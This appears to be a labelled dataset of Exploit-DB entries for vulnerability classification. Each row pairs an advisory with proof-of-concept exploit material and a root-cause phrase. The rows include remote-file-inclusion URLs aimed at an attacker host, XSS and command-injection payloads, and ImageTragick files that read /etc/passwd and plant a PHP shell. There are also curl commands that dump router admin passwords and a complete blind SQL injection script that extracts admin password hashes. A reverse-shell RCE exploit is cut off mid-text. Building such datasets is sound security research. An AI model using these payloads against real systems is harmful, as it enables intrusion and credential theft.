0x#{create_thread_address.to_s(16)} ; &CreateThread        call rax       add  rsp, 16        ; restore arguments that were mangled       pop  rcx       pop  rdx       pop  r8       pop  r9       ret     }     Metasm::Shellcode.assemble(Metasm::X86_64.new, stub).encode_string   end end",exploitation process,1
27615,AzDGVote - Remote File Inclusion source: https://www.securityfocus.com/bid/17447/info  AzDGVote is prone to a remote file-include vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker can exploit this issue to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.  http://www.example.com/poll/view.php?int_path=http://attacker http://www.example.com/ordinaopenpodcast/script/poll/view.php?int_path=http://attacker,a failure in the application to properly sanitize user-supplied input,1
28729,phpBB XS 0.58 - Multiple Remote File Inclusions source: https://www.securityfocus.com/bid/20277/info  phpBB XS is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.  Exploiting these issues could allow an attacker to compromise the application and the underlying system; other attacks are also possible.  phpBB XS 0.58 and prior versions are affected by these issues.  http://www.example.com/[path]/includes/functions_kb.php?phpbb_root_path=http://www.example.com http://www.example.com/[path]/includes/bbcb_mg.php?phpbb_root_path=http://www.example.com,fails to sufficiently sanitize user-supplied data,1
27502,Connect Daily 3.2.8/3.2.9 - 'ViewDay.html' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/17287/info  Connect Daily is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/ViewDay.html?start=2453810&&integral=0&style_sheetuserStyle.css&dropdown=1&show_stop=0&show_resources0&calendar_id=[code] http://www.example.com/ViewDay.html?start=2453810&&integral=0&style_sheet=[code] http://www.example.com/ViewDay.html?start=[code],a failure in the application to properly sanitize user-supplied input,1
23633,"Crob FTP Server 3.5.1 - Denial of Service source: https://www.securityfocus.com/bid/9549/info  A vulnerability has been reported in the Crob FTP server, which occurs due to a lack of validation of input from the user. By issuing a malformed request a malevolent user may be able to force the server to crash, denying service to legitimate users.   dir ......................................................................................................................................................................................................................................................./*",a lack of validation of input from the user,1
25335,"IBM iSeries AS400 LDAP Server - Remote Information Disclosure source: https://www.securityfocus.com/bid/12991/info  A remote information disclosure issue affects IBM iSeries AS400 LDAP Server. This issue is due to a failure of the application to properly secure sensitive information.  An authenticated attacker may leverage this issue to disclose user names and account information of users in their group. This may facilitate further attacks against the affected server.  ldapsearch -h as400.example.com -b ""cn=accounts,os400-sys=S0011223.example.com"" -D ""os400-profile=SCARMEL,cn=accounts,os400-sys=S0011223.example.com"" -w as400Password -L -s sub ""os400-profile=LESLIE""",a failure of the application to properly secure sensitive information,1
32677,Openfire 3.6.2 - 'group-summary.jsp' Cross-Site Scripting source: https://www.securityfocus.com/bid/32937/info  Openfire is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied input data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Openfire 3.6.2 is vulnerable; prior versions may also be affected.   http://www.example.com/group-summary.jsp?search=%22%3E%3C[xss],fails to sufficiently sanitize user-supplied input data,1
32710,"Plunet BusinessManager 4.1 - 'pagesUTF8/auftrag_job.jsp?Pfad' Direct Request Information Disclosure source: https://www.securityfocus.com/bid/33153/info    Plunet BusinessManager is prone to multiple security-bypass and HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.    An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, control how the site is rendered to the user, or perform unauthorized actions as another user; other attacks may also be possible.    Versions prior to BusinessManager 4.2 are vulnerable.  http://www.example.com/pagesUTF8/auftrag_job.jsp?OSG05=1944&anchor=AJob31944 surf jobs",fails to properly sanitize user-supplied input,1
29931,ManageEngine Password Manager Pro Build 5401 - Database Remote Unauthorized Access source: https://www.securityfocus.com/bid/23693/info  ManageEngine Password Manager Pro is prone to a remote unauthorized-access vulnerability due to a design error.  An attacker may leverage this issue to gain unauthorized access to the application's database with administrative privileges. Successful exploits will result in a complete compromise of vulnerable applications and may aid in further attacks.  ManageEngine Password Manager Pro Free edition is vulnerable; other versions may also be affected.   $mysql -h example.com --port 2345 -u root,a design error,1
30949,"OpenBiblio 0.x - 'theme_del_confirm.php?name' Cross-Site Scripting source: https://www.securityfocus.com/bid/27053/info   OpenBiblio is prone to multiple input-validation vulnerabilities because it fails to sufficiently sanitize user-supplied data. The issues include SQL-injection, cross-site scripting, HTML-injection, and local file-include vulnerabilities.   Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, execute arbitrary local scripts, retrieve potentially sensitive information, or exploit latent vulnerabilities in the underlying database.   These issues affect Openbiblio 0.5.2-pre4 and prior versions.   http://www.example.com/openbiblio/admin/theme_del_confirm.php?themeid=6&amp;name=[XSS]",fails to sufficiently sanitize user-supplied data,1
34485,FreeSchool - 'key_words' Cross-Site Scripting source: https://www.securityfocus.com/bid/42513/info  FreeSchool is prone to a cross-site scripting vulnerability because the application fails to sufficiently sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.  FreeSchool 1.1.0 is vulnerable; others may also be affected.   http://www.example.com/biblioteca/index.php?action=bib_searchs&method=searchs&key_words=example%22%27%3E%3Cscript%3Ealert(1)%3C/script%3E,the application fails to sufficiently sanitize user-supplied input,1
33520,"D-Link Routers - Multiple Vulnerabilities The following five D-Link model routers suffer from several vulnerabilities including Clear Text Storage of Passwords, Cross Site Scripting and Sensitive Information Disclosure.  DIR-652 D-Link  Wireless N Gigabit Home Router  DIR-835 D-Link Network DIR-835L Wireless N 750M Dual-band 802.11n 4Port Gigabit Router  DIR-855L - D-Link Wireless N900 Dual Band Gigabit Router  DGL-5500 D-Link AC1300 Gaming Router  DHP-1565 D-Link Wireless N PowerLine Gigabit Router  Affected firmware - FW 1.02b18/1.12b02 or older  Access - Remote Complexity - Low Authentication - None Impact - Full loss of confidentiality  ------------------------------------------------------------------------------------------------------------- Clear Text Password - CWE - CWE-316: Cleartext Storage of Sensitive Information  Authentication can be bypassed to gain access to the file tools_admin.asp, which stores the devices admin password in plain text, by adding a ""/"" to the end of the URL.  Proof of Concept for the DGL-5500, DIR-855L and the DIR-835:  curl -s http://<IP>/tools_admin.asp/ |awk '/hidden/ && /admin_password_tmp/ && /value/ {print $5}'  PoC for the DHP-1565 and DIR-652, the generic 'user' must be added.  curl -s http://<IP>/tools_admin.asp/ -u user:|awk '/hidden/ && /admin_password_tmp/ && /value/ {print $5}'  ------------------------------------------------------------------------------------------------------------- Cross Site Scripting - CWE - CWE-79: Improper Neutralization of User Input / Return  For the file ""apply.cgi"" (""apply_sec.cgi"" on the DGL-5500) the POST param ""action"" suffers from a XSS vulnerability due to improper neutralization of user input / return output.  PoC for DIR-855L, DIR-835, DHP-1565  http://<IP>/apply.cgi  POST graph_code=X&session_id=123456&login_n=user&login_name=8&action=%3Cbody%3E%3Chtml%3E%3Ch2%3E%3CEMBED%20src%3D%22%3Ctd%20dir%3D%22rtl%22class%3D%22skytext%22width%3D%2277%25%22%3E%3Cmarquee%20%20%20scrollAmount%3D5%20scrollDelay%3D10%20direction%3D%22right%22style%3D%22color%3Ared%3Bfont-weight%3Abold%3B%22%3ESquirrel%20Injection%22%3C%2fh2%3E%3C%2fmarquee%3E%20%3C%2fbody%3E%3C%2fhtml%3E%3C%2ftd%3E%3E&log_pass=&html_response_page=login_pic.asp&tmp_log_pass=&gcode_base64=MTg0MzU%3D HTTP/1.1  For the DGL-5500  http://<IP>/apply_sec.cgi  POST graph_code=X&session_id=123456&login_n=user&login_name=8&action=%3Cbody%3E%3Chtml%3E%3Ch2%3E%3CEMBED%20src%3D%22%3Ctd%20dir%3D%22rtl%22class%3D%22skytext%22width%3D%2277%25%22%3E%3Cmarquee%20%20%20scrollAmount%3D5%20scrollDelay%3D10%20direction%3D%22right%22style%3D%22color%3Ared%3Bfont-weight%3Abold%3B%22%3ESquirrel%20Injection%22%3C%2fh2%3E%3C%2fmarquee%3E%20%3C%2fbody%3E%3C%2fhtml%3E%3C%2ftd%3E%3E&log_pass=&html_response_page=login_pic.asp&tmp_log_pass=&gcode_base64=MTg0MzU%3D HTTP/1.1  ------------------------------------------------------------------------------------------------------------- Sensitive Information Disclosure - CWE - CWE-200: Information Exposure  The D-Link models DGL-5500, DIR-855L, DIR-835 suffer from a vulnerability which an unauthenticated person can gain access the sensitive files:  http://<IP>:8080/hnap.cgi and /HNAP1/ via:  curl -s curl -s http://<IP>:8080/HNAP1/  On the DIR-652  and DHP-1565, a user needs authentication first to gain access to these files.  But more importantly, an unauthenticated user can browse directly to http://<IP>/cgi/ssi/ which will offer a download of the device's ELF MBS MIPS file. The file contains most of the devices internal working structure and sensitive information. These particular routers use  a MSB EM_MIPS Processor and it does contain executable components.  The file can be accessed through at least one known cgi file, however there maybe others. Although no known publicly working example exist to my knowledge, unpatched devices are susceptible to injection of malicious code and most likely susceptible to a payload which could deploy a self-replicating worm. -------------------------------------------------------------------------------------------------------------  These items were reported to D-Link on April 20th, and to US Cert on April 21. D-Link does have patches available for all affected models, and it is highly recommended to update the device's firmware as soon as possible.  Vendor Links: http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10025 http://securityadvisories.dlink.com/security/  Research Contact - Kyle Lovett May 21, 2014",improper neutralization of user input / return output,1
39767,"ImageMagick 7.0.1-0 / 6.9.3-9 - 'ImageTragick ' Multiple Vulnerabilities Nikolay Ermishkin from the Mail.Ru Security Team discovered several vulnerabilities in ImageMagick. We've reported these issues to developers of ImageMagick and they made a fix for RCE in sources and released new version (6.9.3-9 released 2016-04-30 http://legacy.imagemagick.org/script/changelog.php), but this fix seems to be incomplete. We are still working with developers.  ImageMagick: Multiple vulnerabilities in image decoder  1. CVE-2016-3714 - Insufficient shell characters filtering leads to (potentially remote) code execution  Insufficient filtering for filename passed to delegate's command allows remote code execution during conversion of several file formats.  ImageMagick allows to process files with external libraries. This feature is called 'delegate'. It is implemented as a system() with command string ('command') from the config file delegates.xml with actual value for different params (input/output filenames etc). Due to insufficient %M param filtering it is possible to conduct shell command injection. One of the default delegate's command is used to handle https requests: ""wget"" -q -O ""%o"" ""https:%M"" where %M is the actual link from the input. It is possible to pass the value like `https://example.com""|ls ""-la` and execute unexpected 'ls -la'. (wget or curl should be installed)  $ convert 'https://example.com""|ls ""-la' out.png total 32 drwxr-xr-x 6 user group 204 Apr 29 23:08 . drwxr-xr-x+ 232 user group 7888 Apr 30 10:37 .. ...   The most dangerous part is ImageMagick supports several formats like svg, mvg (thanks to https://hackerone.com/stewie for his research of this file format and idea of the local file read vulnerability in ImageMagick, see below), maybe some others - which allow to include external files from any supported protocol including delegates. As a result, any service, which uses ImageMagick to process user supplied images and uses default delegates.xml / policy.xml, may be vulnerable to this issue.  exploit.mvg -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 fill 'url(https://example.com/image.jpg""|ls ""-la)' pop graphic-context  exploit.svg -=-=-=-=-=-=-=-=- <?xml version=""1.0"" standalone=""no""?> <!DOCTYPE svg PUBLIC ""-//W3C//DTD SVG 1.1//EN"" ""http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd""> <svg width=""640px"" height=""480px"" version=""1.1"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink= ""http://www.w3.org/1999/xlink""> <image xlink:href=""https://example.com/image.jpg""|ls ""-la"" x=""0"" y=""0"" height=""640px"" width=""480px""/> </svg>  $ convert exploit.mvg out.png total 32 drwxr-xr-x 6 user group 204 Apr 29 23:08 . drwxr-xr-x+ 232 user group 7888 Apr 30 10:37 .. ...  ImageMagick tries to guess the type of the file by it's content, so exploitation doesn't depend on the file extension. You can rename exploit.mvg to exploit.jpg or exploit.png to bypass file type checks. In addition, ImageMagick's tool 'identify' is also vulnerable, so it can't be used as a protection to filter file by it's content and creates additional attack vectors (e.g. via 'less exploit.jpg', because 'identify' is invoked via lesspipe.sh). Ubuntu 14.04 and OS X, latest system packages (ImageMagick 6.9.3-7 Q16 x86_64 2016-04-27 and ImageMagick 6.8.6-10 2016-04-29 Q16) and latest sources from 6 and 7 branches all are vulnerable. Ghostscript and wget (or curl) should be installed on the system for successful PoC execution. For svg PoC ImageMagick's svg parser should be used, not rsvg.  All other issues also rely on dangerous ImageMagick feature of external files inclusion from any supported protocol in formats like svg and mvg.  2. CVE-2016-3718 - SSRF It is possible to make HTTP GET or FTP request:  ssrf.mvg -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 fill 'url(http://example.com/)' pop graphic-context  $ convert ssrf.mvg out.png # makes http request to example.com  3. CVE-2016-3715 - File deletion It is possible to delete files by using ImageMagick's 'ephemeral' pseudo protocol which deletes files after reading:  delete_file.mvg -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'ephemeral:/tmp/delete.txt' popgraphic-context  $ touch /tmp/delete.txt $ convert delete_file.mvg out.png # deletes /tmp/delete.txt  4. CVE-2016-3716 - File moving It is possible to move image files to file with any extension in any folder by using ImageMagick's 'msl' pseudo protocol. msl.txt and image.gif should exist in known location - /tmp/ for PoC (in real life it may be web service written in PHP, which allows to upload raw txt files and process images with ImageMagick):  file_move.mvg -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'msl:/tmp/msl.txt' popgraphic-context  /tmp/msl.txt -=-=-=-=-=-=-=-=- <?xml version=""1.0"" encoding=""UTF-8""?> <image> <read filename=""/tmp/image.gif"" /> <write filename=""/var/www/shell.php"" /> </image>  /tmp/image.gif - image with php shell inside (https://www.secgeek.net/POC/POC.gif for example)  $ convert file_move.mvg out.png # moves /tmp/image.gif to /var/www/shell.php  5. CVE-2016-3717 - Local file read (independently reported by original research author - https://hackerone.com/stewie) It is possible to get content of the files from the server by using ImageMagick's 'label' pseudo protocol:  file_read.mvg -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'label:@...c/passwd' pop graphic-context  $ convert file_read.mvg out.png # produces file with text rendered from /etc/passwd   How to mitigate the vulnerability.  Available patches appear to be incomplete. If you use ImageMagick or an affected library, we recommend you mitigate the known vulnerabilities by doing at least one these two things (but preferably both!): 1. Verify that all image files begin with the expected �magic bytes� corresponding to the image file types you support before sending them to ImageMagick for processing. (see FAQ for more info) 2. Use a policy file to disable the vulnerable ImageMagick coders. The global policy for ImageMagick is usually found in �/etc/ImageMagick�. This policy.xml example will disable the coders EPHEMERAL, URL, MVG, and MSL:  <policymap>     <policy domain=""coder"" rights=""none"" pattern=""EPHEMERAL"" />     <policy domain=""coder"" rights=""none"" pattern=""URL"" />     <policy domain=""coder"" rights=""none"" pattern=""HTTPS"" />     <policy domain=""coder"" rights=""none"" pattern=""MVG"" />     <policy domain=""coder"" rights=""none"" pattern=""MSL"" /> </policymap>   Vulnerability Disclosure Timeline: April, 21 2016 - file read vulnerability report for one of My.Com services from https://hackerone.com/stewie received by Mail.Ru Security Team. Issue is reportedly known to ImageMagic team. April, 21 2016 - file read vulnerability patched by My.Com development team April, 28 2016 - code execution vulnerability in ImageMagick was found by Nikolay Ermishkin from Mail.Ru Security Team while researching original report April, 30 2016 - code execution vulnerability reported to ImageMagick development team April, 30 2016 - code execution vulnerability fixed by ImageMagick (incomplete fix) April, 30 2016 - fixed ImageMagic version 6.9.3-9 published (incomplete fix) May, 1 2016 - ImageMagic informed of the fix bypass May, 2 2016 - limited disclosure to 'distros' mailing list May, 3 2016 - public disclosure at https://imagetragick.com/",insufficient %M param filtering,1
21918,"VBZoom 1.0 - SQL Injection source: https://www.securityfocus.com/bid/5919/info  A SQL injection vulnerability has been discovered in VBZoom v1.01.  Due to insufficient sanitization of variables used to construct SQL queries, it is possible to modify the logic of a query, via a malicious request.  Exploiting this issue could allow an attacker to reset the password of an arbitrary forum user. The ability to impersonate arbitrary users could potentially allow an attacker to launch further attacks against the vulnerable server.  Other SQL injection attacks may also be possible.   Exploit code ************** <form name=""f1"" action=""http://www.victim.com/vbzoom/register.php"" method=""POST""> <input type=""hidden"" name=""ChangeProfile"" value=""1""> User Name: <input type=""text"" name=""UserName""><br> Password: <input type=""text"" name=""Password""><br> Email: <input type=""text"" name=""Email""> <input type=""hidden"" name=""HomePage"" value=""lamerZ""> <input type=""hidden"" name=""VBZooMForumCookiesUserName"" value=""false""> <input type=""hidden"" name=""VBZooMForumCookiesUserName"" value=""false""> <input type=""submit"" value=""reset password""> </form>",insufficient sanitization of variables used to construct SQL queries,1
29190,"Apple Mac OSX 10.4.x - Mach-O Binary Loading Integer Overflow source: https://www.securityfocus.com/bid/21291/info  Apple Mac OS X is prone to a local integer-overflow vulnerability. This issue occurs when the operating system fails to handle specially crafted binaries.   A successful exploit would allow a local attacker to execute arbitrary code with kernel-level privileges, leading to the complete compromise of affected computers. Failed exploit attempts will result in a denial-of-service condition.  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/29190.bz2",the operating system fails to handle specially crafted binaries,1
25684,"D-Link DSL Router - Remote Authentication Bypass source: https://www.securityfocus.com/bid/13679/info  Various D-Link DSL routers are susceptible to a remote authentication bypass vulnerability. This issue is due to a failure of the devices to require authentication in certain circumstances.  This vulnerability allows remote attackers to gain complete administrative access to affected devices.  Various D-Link devices with the following firmware revisions are affected by this issue: - V1.00B01T16.EN.20040211 - V1.00B01T16.EU.20040217 - V0.00B01T04.UK.20040220 - V1.00B01T16.EN.20040226 - V1.00B02T02.EU.20040610 - V1.00B02T02.UK.20040618 - V1.00B02T02.EU.20040729 - V1.00B02T02.DE.20040813 - V1.00B02T02.RU.20041014  Due to the common practice of code reuse, other devices are also likely affected by this issue.   <html><head>Download config.xml:<title>GetConfig - Config file download</title></head><body>  <script lang=""javascript""> function invia_richiesta() { document.DownloadConfig.action='http://'+document.InputBox.Host.value+'/cgi-bin/firmwarecfg'; document.DownloadConfig.submit(); } </script>  <form name=""InputBox""> <br>http://<input Name=""Host"" type=""text"" value="""">/cgi-bin/firmwarecfg<br> </form> <form name=""DownloadConfig"" method=""POST"" action="""" enctype=""multipart/form-data""> <input type=""Submit"" name=""config"" value=""Download"" onClick=""javascript:invia_richiesta();""><br> </form></body></html>",a failure of the devices to require authentication in certain circumstances,1
21157,"bharat Mediratta Gallery 1.1/1.2 - Directory Traversal source: https://www.securityfocus.com/bid/3554/info  Bharat Mediratta Gallery is a free, open source web-based photo album which may be used as an add-on for the PHPNuke web portal.  Due to insufficient validation of user-supplied input, it is be possible to view arbitrary web-readable files via a specially crafted web request which contains '../' sequences.  This issue may allow a remote attacker to gather sensitive information which may be used in directed and organized attacks against a host running the Gallery software.  http://www.somehost.com/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/hosts",insufficient validation of user-supplied input,1
45400,"Apache Syncope 2.0.7 - Remote Code Execution # Exploit Title: Apache Syncope 2.0.7 - Remote Code Execution # Date: 2018-09-12 # Exploit Author: Che-Chun Kuo # Vendor Homepage: https://syncope.apache.org/ # Software Link: http://archive.apache.org/dist/syncope/ # Version: 2.0.7 # Tested on: Windows # Advisory: https://syncope.apache.org/security # CVE: CVE-2018-1321, CVE-2018-1322  # Vulnerability 1: Remote code execution by users with report and template privileges # Description: A user with access to the Reports and Templates functionality can use XSL Transformations (XSLT)  # to perform malicious operations, including but not limited to file read, file write, and code execution.   # Apache Syncope uses XSLT to export report data into various formats. An attacker can perform malicious  # operations by crafting a XSL template, binding the template to a report, executing, then exporting the report.  # The following XSL can be used to read the Syncope security.properties file or execute the Windows  # calc program, respectively.    READ security.properties file ------------------------------------------- <?xml version=""1.0"" encoding=""ISO-8859-1""?> <!DOCTYPE xsl:stylesheet [<!ENTITY file SYSTEM ""..\webapps\syncope\WEB-INF\classes\security.properties"">]> <xsl:stylesheet version=""1.0""  	xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"">     <xsl:template match=""/"">&file;</xsl:template> </xsl:stylesheet>  EXECUTE Windows calc program ------------------------------------------- <xsl:stylesheet version=""1.0""  	xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" 	xmlns:runtime=""http://xml.apache.org/xalan/java/java.lang.Runtime"" 	xmlns:process=""http://xml.apache.org/xalan/java/java.lang.Process"">     <xsl:variable name=""rtobject"" select=""runtime:getRuntime()""/>     <xsl:variable name=""process"" select=""runtime:exec($rtobject,'calc')""/>     <xsl:variable name=""waiting"" select=""process:waitFor($process)""/>     <xsl:value-of select=""$process""/> </xsl:stylesheet> 	 # Vulnerability 2: Information disclosure via FIQL and ORDER BY sorting # Description: A user with entitlements to the /syncope/rest/users endpoint can recover sensitive  # security values using the fiql and orderby parameters.   # By default, Apache Syncope prevents sensitive values from being returned when querying  # the /syncope/rest/users endpoint. Fields such as securityAnswers or password will always return null.  # However the results returned can be filtered or sorted based on sensitive fields. By measuring how  # the results are returned the values of the desired fields can be successfully recovered. The fiql parameter  # can be used to recover full security answers, and the orderby parameter can be used to recover  # full security answers and partial information about password hashes.   # The fiql parameter allows filtering based on user attributes, including a user's security answer.  # By using FIQL filters (i.e. ""securityAnswer==a*"", ""securityAnswer==b*"", etc...) a user's  # securityAnswer can be recovered one letter at a time.   # The orderby parameter allows sorting based on user attributes, including a user's security  # answer and password. The following example shows how orderby sorting can be exploited.   # User Bob exists with the security answer ""test"". A malicious user creates a user Alice with the  # security answer ""ta"". The malicious actor then calls the /syncope/rest/users endpoint with orderby=securityAnswer"". # By sorting using the ""securityAnswer"" attribute, the result will have Alice sorted ahead of Bob,  # due to the value ""ta"" being before the value ""test"". By sequentially changing Alice's security  # question and comparing the sorted result, Bob's security answer can be recovered one letter  # at a time. A similar technique can be used to reveal partial information about user password hashes.  Orderby Example Results:  Alice's security answer, Order of results returned ta, [Alice, Bob] tb, [Alice, Bob] tc, [Alice, Bob] td, [Alice, Bob] te, [Alice, Bob] tf, [Bob, Alice] tea, [Alice, Bob] teb, [Alice, Bob]","the value ""ta"" being before the value ""test""",1
34052,"osCommerce Visitor Web Stats AddOn - 'Accept-Language' Header SQL Injection source: https://www.securityfocus.com/bid/40425/info  osCommerce Visitor Web Stats is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  import sys import http.client  if len(sys.argv) < 2:         print(""usage: "" + sys.argv[0] + "" <host> [<path>]"")         sys.exit();  host = sys.argv[1] if len(sys.argv) > 2:         path = sys.argv[2] else:         path = ""/""  def req(lang):         c = http.client.HTTPConnection(host)         c.request('GET', path, '', {'Accept-Language': lang})         return c.getresponse().read();  def check(condition):         r = req(""' AND 1=0 UNION SELECT id FROM administrators "" + condition         + "" -- '"")         if r.find(b'update') != -1:                 return 1;         elif r.find(b'Unknown column') != -1:                 print('Unknown database structure (no rc version?)')                 sys.exit();         return 0;  if req(""'"").find(b'select counter FROM visitors where browser_ip') == -1:         print('Target does not seem to have (a vulnarable version of)         Visitor Web Stats or doesn\'t output any error messages')         sys.exit();  admin_count = 1 while not check(""HAVING COUNT(*) = "" + str(admin_count)):         admin_count += 1; print(""Number of admins: "" + str(admin_count))  pw_chars = [x for x in range(48, 58)] pw_chars.extend([x for x in range(97, 103)]) pw_chars.sort()  todo = [('', 0, 255)] while len(todo):         (found, start, end) = todo.pop()         if start == 0 and end == 255 and check(""WHERE user_name = '"" + found         + ""'""):                 sys.stdout.write(found + "" "")                 sys.stdout.flush()                 for i in range(35):                         if i == 32:                                 sys.stdout.write("":"")                                 sys.stdout.flush()                                 continue                         pw_start, pw_end = 0, len(pw_chars) - 1                         while pw_start != pw_end:                                 pw_mid = int((pw_start + pw_end) / 2)                                 if check(""WHERE user_name = '"" + found + ""'                                 AND ORD(SUBSTRING(user_password, "" + str(i + 1) + "", 1)) <= "" + str(pw_chars[pw_mid])):                                         pw_end = pw_mid                                 else:                                         if pw_mid == pw_end - 1:                                                 pw_start = pw_end                                         else:                                                 pw_start = pw_mid                         sys.stdout.write(chr(pw_chars[pw_start]))                         sys.stdout.flush()                 print()                 if not check(""WHERE SUBSTRING(user_name, 1, "" +                 str(len(found)) + "") = '"" + found + ""' AND SUBSTRING(user_name, "" + str(len(found) + 1) + "", 1) > 0""):                         continue;         mid = int((start + end) / 2)         if check(""WHERE SUBSTRING(user_name, 1, "" + str(len(found)) + "") =         '"" + found + ""' AND ORD(SUBSTRING(user_name, "" + str(len(found) + 1) + "", 1)) <= "" + str(mid) + "" AND ORD(SUBSTRING(user_name, "" + str(len(found) + 1) + "", 1)) > 0""):                 if mid == start + 1:                         todo.append((found + chr(mid), 0, 255))                 else:                         todo.append((found, start, mid))         if check(""WHERE SUBSTRING(user_name, 1, "" + str(len(found)) + "") =         '"" + found + ""' AND ORD(SUBSTRING(user_name, "" + str(len(found) + 1) + "", 1)) > "" + str(mid)):                 if mid == end - 1:                         todo.append((found + chr(end), 0, 255))                 else:                         todo.append((found, mid, end))",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
27856,"GNU BinUtils 2.1x - Buffer Overflow source: https://www.securityfocus.com/bid/17950/info  GNU 'binutils' is prone to a buffer-overflow vulnerability because it fails to properly bounds-check user-supplied input before copying it to an insufficiently sized memory buffer.  Remote attackers may crash the 'strings' utility, potentially making analysis of malicious binaries more difficult. Attackers may also execute arbitrary machine code in the context of applications that use the affected library.  %253Cc%253Cc%253Cc%253Cc%253Cc%253Cc%253Cc",fails to properly bounds-check user-supplied input before copying it to an insufficiently sized memory buffer,1
32235,Meet#Web 0.8 - 'RegResource.class.php?root_path' Remote File Inclusion source: https://www.securityfocus.com/bid/30673/info      Meet#Web is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.      Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.      Meet#Web 0.8 is vulnerable; other versions may also be affected.   http://www.example.com/cms/meetweb/classes/RegResource.class.php?root_path=[SHell],fails to sufficiently sanitize user-supplied data,1
33199,68 Classifieds 4.1 - 'searchresults.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/36208/info    '68 Classifieds' is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.    An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.    These issues affect 68 Classifieds 4.1; other versions may also be affected.    http://www.example.com/searchresults.php?page=[code],fails to properly sanitize user-supplied input,1
27589,SPIP 1.8.3 - 'Spip_login.php' Remote File Inclusion source: https://www.securityfocus.com/bid/17423/info  SPIP is prone to a remote file-include vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker can exploit this issue to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.  http://www.example.com/[spip_dir]/spip_login.php3?url=[Evil_url],a failure in the application to properly sanitize user-supplied input,1
48380,"Furukawa Electric ConsciusMAP 2.8.1 - Remote Code Execution # Exploit Title: Furukawa Electric ConsciusMAP 2.8.1 - Remote Code Execution # Date: 2020-04-24 # Vendor Homepage: https://www.tecnoredsa.com.ar # Exploit Authors: LiquidWorm # Software Link: https://dl.getpopcorntime.is/PopcornTime-latest.exe # Version: 2.8.1 # CVE : N/A  #!/usr/bin/env python3 # -*- coding: utf-8 -*- # # # Furukawa Electric ConsciusMAP 2.8.1 Java Deserialization Remote Code Execution # # # Vendor: Furukawa Electric Co., Ltd. | Tecnored SA # Product web page: https://www.furukawa.co.jp | https://www.tecnoredsa.com.ar # Affected version: APROS Evolution | 2.8.1 #                   FURUKAWA        | 2.7.10 #                   ConsciusMAP     | 2.6.4 #                                   | 2.3.1 #                                   | 2.1.49 #                                   | 2.1.36 #                                   | 2.1.31 #                                   | 2.1.18 #                                   | 2.1.16 #                                   | 2.1.15 #                                   | 2.1.1 #                                   | 2.0.1174 #                                   | 1.8 #                                   | 1.4.70 # # Summary: Apros Evoluation / Furukawa / ConsciusMap is the Tecnored # provisioning system for FTTH networks. Complete administration of # your entire external FTTH network plant, including from the ONUs # installed in each end customer, to the wiring and junction boxes. # Unify all the management of your FTTH network on a single platform. # Unify all your data, whether from customers, your network, or the # external plant in one place. APROS FTTH allows you to manage your # entire FTTH network in a simple and globalized way with just one # click, without being a network expert. Includes services such as: # bandwidth limitation, Turbo Internet for time plans, BURST Internet, # QinQ for companies, and many more. General consumption graphics and # per customer in real time. Captive Portal for cutting or suspension # of the service. # # Desc: The FTTH provisioning solution suffers from an unauthenticated # remote code execution vulnerability due to an unsafe deserialization # of Java objects (ViewState) triggered via the 'javax.faces.ViewState' # HTTP POST parameter. The deserialization can cause the vulnerable JSF # web application to execute arbitrary Java functions, malicious Java # bytecode, and system shell commands with root privileges. # # =================================================================== # $ ./furukawa.py 172.16.0.1:8080 172.168.0.200 4444 # [*] Setting up valid URL path # [*] Starting callback listener child thread # [*] Starting handler on port 4444 # [*] Sending serialized object # [*] Connection from 172.16.0.1:48446 # [*] You got shell! # tomcat7@zslab:/var/lib/tomcat7$ id # uid=114(tomcat7) gid=124(tomcat7) grupos=124(tomcat7),1003(furukawa) # tomcat7@zslab:/var/lib/tomcat7$ sudo su # id # uid=0(root) gid=0(root) grupos=0(root) # exit # tomcat7@zslab:/var/lib/tomcat7$ exit # *** Connection closed by remote host *** # =================================================================== # # Tested on: Apache 